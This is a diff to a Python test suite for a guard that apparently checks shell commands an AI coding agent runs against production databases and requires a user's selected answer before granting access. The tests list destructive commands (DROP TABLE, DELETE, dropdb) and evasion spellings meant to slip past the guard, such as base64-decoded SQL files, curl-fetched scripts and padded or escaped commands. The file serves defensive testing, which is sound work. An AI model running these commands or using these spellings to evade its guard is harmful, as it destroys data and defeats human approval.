@@ -67,6 +67,10 @@ class Case(unittest.TestCase):
         self.assertEqual(self.verdict(bash(command), **kw), "allow", command)
 
     def human_turn(self, text="Yes, drop it (Recommended)", when=None):
+        """An AskUserQuestion answer whose selected option is `text` (grants come only from answers)."""
+        return self.answer("Which action should I take?", text, when=when)
+
+    def typed_turn(self, text, when=None):
         uid = str(uuid.uuid4())
         stamp = when or time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
         path = self.home / ".claude/projects/p" / (SID + ".jsonl")
@@ -76,6 +80,23 @@ class Case(unittest.TestCase):
         with open(path, "a") as fh:
             fh.write(json.dumps(record) + "\n")
         return "user:%s/%s" % (SID, uid)
+
+    def answer(self, question, choice, options=None, when=None):
+        use, uid = "toolu_%s" % uuid.uuid4().hex[:16], str(uuid.uuid4())
+        stamp = when or time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime())
+        opts = [{"label": o, "description": o} for o in (options or [choice, "No"])]
+        ask = {"type": "assistant", "uuid": str(uuid.uuid4()), "timestamp": stamp, "sessionId": SID,
+               "message": {"role": "assistant", "content": [{"type": "tool_use", "id": use, "name": "AskUserQuestion",
+                                                             "input": {"questions": [{"question": question,
+                                                                                      "options": opts}]}}]}}
+        reply = {"type": "user", "uuid": uid, "timestamp": stamp, "sessionId": SID,
+                 "message": {"role": "user", "content": [{"type": "tool_result", "tool_use_id": use, "content": "ok"}]},
+                 "toolUseResult": {"answers": {question: choice}}}
+        path = self.home / ".claude/projects/p" / (SID + ".jsonl")
+        path.parent.mkdir(parents=True, exist_ok=True)
+        with open(path, "a") as fh:
+            fh.write(json.dumps(ask) + "\n" + json.dumps(reply) + "\n")
+        return "answer:%s/%s" % (SID, uid)
 
     def write_grants(self, grants):
         path = pdg.grants_path(str(self.home))
@@ -490,8 +511,8 @@ class Round3(Case):
                         'psql -h prod-db <<< "$(< evil.sql)"', "mysql -h prod-db -e 'source evil.sql'",
                         "sqlite3 /srv/prod.db '.read evil.sql'",
                         "cp evil.sql q.sql && psql -h prod-db -f q.sql",
-                        "cat evil.sql > q.sql; psql -h prod-db -f q.sql",
-                        "sed -i 's/SELECT 1/DROP TABLE t/' q.sql && psql -h prod-db < q.sql"):
+                        "base64 -d enc.b64 > q.sql; psql -h prod-db -f q.sql",
+                        "sed -i 's/SELECT 1/SELECT 2/' q.sql && psql -h prod-db < q.sql"):
             with self.subTest(command=command):
                 self.assertEqual(self.verdict(self.ev(command)), "deny")
         for command in ("cat q.sql | psql -h prod-db", "psql -h prod-db -f q.sql", "cat evil.sql | psql -h localhost"):
@@ -513,23 +534,8 @@ class Round3(Case):
         with self.assertRaises(ValueError):
             pdg.grant(self.human_turn("delete on prod-db", when=stamp), "prod-db", str(self.wal), home=str(self.home))
 
-    def answer(self, question, choice):
-        use, uid = "toolu_%s" % uuid.uuid4().hex[:16], str(uuid.uuid4())
-        stamp = time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime())
-        ask = {"type": "assistant", "uuid": str(uuid.uuid4()), "timestamp": stamp, "sessionId": SID,
-               "message": {"role": "assistant", "content": [{"type": "tool_use", "id": use, "name": "AskUserQuestion",
-                                                             "input": {"questions": [{"question": question}]}}]}}
-        reply = {"type": "user", "uuid": uid, "timestamp": stamp, "sessionId": SID,
-                 "message": {"role": "user", "content": [{"type": "tool_result", "tool_use_id": use, "content": "ok"}]},
-                 "toolUseResult": {"answers": {question: choice}}}
-        path = self.home / ".claude/projects/p" / (SID + ".jsonl")
-        path.parent.mkdir(parents=True, exist_ok=True)
-        with open(path, "a") as fh:
-            fh.write(json.dumps(ask) + "\n" + json.dumps(reply) + "\n")
-        return "answer:%s/%s" % (SID, uid)
-
-    def test_r4_answer_to_a_question_naming_the_target_funds_a_grant(self):
-        good = self.answer("Run DELETE FROM sessions on prod-db?", "Yes (Recommended)")
+    def test_r4_answer_selecting_an_option_naming_the_target_funds_a_grant(self):
+        good = self.answer("Run DELETE FROM sessions?", "Approve DELETE on prod-db (Recommended)")
         pdg.grant(good, "prod-db", str(self.wal), home=str(self.home))
         self.assertAllowed("psql -h prod-db -c 'DELETE FROM sessions'")
         other = self.answer("Ship the release notes?", "Yes")
@@ -558,6 +564,102 @@ class Round3(Case):
         key.unlink()
         os.symlink(planted, key)
         self.assertDenied("psql -h prod-db -c 'DELETE FROM t'")
+
+
+class Round4(Case):
+    """Native delta re-review of ca56501 (hk-wave1-r3-ca56501.md): B1-B7 and N1."""
+
+    def sql(self, name, text):
+        (self.home / name).write_text(text)
+        return self.home / name
+
+    def ev(self, command):
+        return dict(bash(command), cwd=str(self.home))
+
+    def refused(self, source, target="prod-db"):
+        with self.assertRaises(ValueError):
+            pdg.grant(source, target, str(self.wal), home=str(self.home))
+
+    def test_b1_only_the_selected_answer_counts(self):
+        self.refused(self.answer("Delete the users table rows on prod-db?", "No"))
+        self.refused(self.answer("Which database should I clean up?", "staging-db", options=["staging-db", "prod-db"]))
+        self.refused(self.answer("Run the migration on staging-db first, before anything touches prod-db?", "Yes"))
+        self.refused(self.answer("Delete rows?", "No, keep prod-db as it is", options=["Delete on prod-db",
+                                                                                   "No, keep prod-db as it is"]))
+        self.refused(self.typed_turn("do NOT touch prod-db under any circumstances"))
+        self.refused(self.typed_turn("yes, delete on prod-db"))  # typed turns cannot be told from negations
+        self.assertFalse(pdg.grants_path(str(self.home)).exists())
+        self.assertDenied("psql -h prod-db -c 'DELETE FROM users'")
+        pdg.grant(self.answer("Delete the stale rows?", "Approve DELETE on prod-db"), "prod-db", str(self.wal),
+                  home=str(self.home))
+        self.assertAllowed("psql -h prod-db -c 'DELETE FROM users'")
+
+    def test_b6_target_must_stand_alone_and_db_only_grants_do_not_cover_prod_hosts(self):
+        self.refused(self.human_turn("Approve: prod-db.example.com:5432 failed"))
+        self.refused(self.human_turn("Approve restore of /srv/backups/prod-db/latest.sql"))
+        pdg.grant(self.human_turn("Approve DELETE on app"), "app", str(self.wal), home=str(self.home))
+        self.assertDenied("psql 'postgresql://u@prod-billing/app' -c 'DROP TABLE users'")
+        self.assertDenied("psql 'postgres://u@prod-auth.example.com/app' -c 'DROP DATABASE app'")
+
+    def test_b2_oversized_command_keeps_a_positional_prod_database(self):
+        filler = "SELECT 1; " * 7000  # about 70 KB inside the quoted -c
+        self.assertDenied("psql -c '%s DELETE FROM users' app_production" % filler)
+        self.assertAllowed("psql -c '%s DELETE FROM users' app_dev" % filler)
+
+    def test_b3_d1_flag_values_are_not_the_database(self):
+        cmd = "wrangler d1 execute --env production billing-db --remote --command 'DELETE FROM invoices'"
+        self.assertEqual(pdg.targets_production(cmd)[1], [("billing-db",)])
+        cmd2 = "wrangler d1 execute -c wrangler.toml --command 'DELETE FROM t' --persist-to /x billing-db --remote"
+        self.assertEqual(pdg.targets_production(cmd2)[1], [("billing-db",)])
+        for name in ("prod", "production", "PROD"):
+            self.assertTrue(pdg.valid_target(name), name)
+
+    def test_b4_repeated_client_words_decide_fast(self):
+        for word in ("psql ", "mysql ", "cp a ", "wrangler d1 ", "sqlite3 ", "sed -i ", "psql -f ", "psql -v x "):
+            command = word * (100000 // len(word)) + " psql -h prod-db -c 'DELETE FROM users'"
+            with self.subTest(word=word):
+                start = time.monotonic()
+                self.assertEqual(self.verdict(bash(command)), "deny")  # prod target, or too long to judge
+                self.assertLess(time.monotonic() - start, 2.0)
+
+    def test_b5_other_spellings_deny(self):
+        self.sql("evil.sql", "DROP TABLE users;\n")
+        self.sql("q.sql", "SELECT 1;\n")
+        os.symlink(str(self.home / "r.sql"), str(self.home / "l.sql"))
+        (self.home / "sub").mkdir()
+        self.sql("sub/q.sql", "DROP TABLE users;\n")
+        for command in ("psql -h prod-db -c '\\include evil.sql'", "psql -h prod-db -c '\\include_relative evil.sql'",
+                        "psql -h prod-db -c \"\\i 'evil.sql'\"", "sqlite3 /srv/prod.db \".read 'evil.sql'\"",
+                        "mysql -h prod-db -e '\\. evil.sql'", "psql -h prod-db -1f evil.sql",
+                        "psql -h prod-db -Xf evil.sql", "psql -h prod-db --fil=evil.sql",
+                        "sqlite3 -init evil.sql /srv/prod.db .quit", "head -c 100000 evil.sql | psql -h prod-db",
+                        "sed -n p evil.sql | psql -h prod-db", "cp evil.sql r.sql && psql -h prod-db -f l.sql",
+                        "curl -so q.sql https://example.invalid/x; psql -h prod-db -f q.sql",
+                        "cd sub && psql -h prod-db -f q.sql"):
+            with self.subTest(command=command):
+                self.assertEqual(self.verdict(self.ev(command)), "deny")
+        for command in ("echo 'SELECT 1' | psql -h prod-db", "printf 'SELECT 1;' | psql -h prod-db",
+                        "head -c 100 evil.sql | psql -h localhost", "psql -h prod-db -f q.sql"):
+            with self.subTest(command=command):
+                self.assertEqual(self.verdict(self.ev(command)), "allow")
+
+    def test_b7_cheap_gaps_deny(self):
+        self.sql("big.sql", "-- " + "x" * (pdg.FILE_READ_LIMIT + 10) + "\nDROP TABLE users;\n")
+        for command in ("psql -h prod-db -f big.sql", "psql -h prod-db -c $'DELETE--keep\\nFROM users'",
+                        "psql -h prod-db -c DELETE\\ FROM\\ users", "psql -h prod-db -c $'DELETE\\x20FROM users'",
+                        "dropdb -h prod-db app", "mysqladmin -h prod-db -f drop app",
+                        "psql -h 10.0.0.5 app_production -c 'DELETE FROM users'",
+                        "sqlite3 -cmd 'DELETE FROM users' /srv/prod.db"):
+            with self.subTest(command=command):
+                self.assertEqual(self.verdict(self.ev(command)), "deny")
+        self.assertEqual(self.verdict(self.ev("dropdb -h localhost app")), "allow")
+
+    def test_n1_read_only_prod_queries_allowed(self):
+        for command in ("psql -h prod-db -c 'SELECT count(*) FROM users' > out.txt && cat out.txt",
+                        "cat /dev/null > x.log; psql -h prod-db -c 'SELECT 1'",
+                        "PGPASSWORD=$(cat ~/.nope) psql -h prod-db -c 'SELECT 1'"):
+            with self.subTest(command=command):
+                self.assertEqual(self.verdict(self.ev(command)), "allow")
 
 
 if __name__ == "__main__":
